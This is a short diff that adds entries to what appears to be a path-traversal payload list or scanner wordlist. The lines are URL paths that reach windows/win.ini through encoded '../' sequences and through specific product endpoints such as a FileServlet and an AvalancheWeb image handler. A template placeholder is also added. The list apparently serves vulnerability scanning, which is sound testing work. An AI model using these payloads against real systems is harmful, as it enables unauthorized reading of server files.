@@ -12,3 +12,5 @@
 /?url=..%2f..%2f..%2f..%2f..%2f..%2fwindows/win.ini
 /oliver/FileServlet?source=serverFile&fileName=c:/windows/win.ini
 /portal//..\\\..\\\..\\\..\\\windows\win.ini
+/AvalancheWeb/image?imageFilePath=C:/windows/win.ini
+{{paths}}
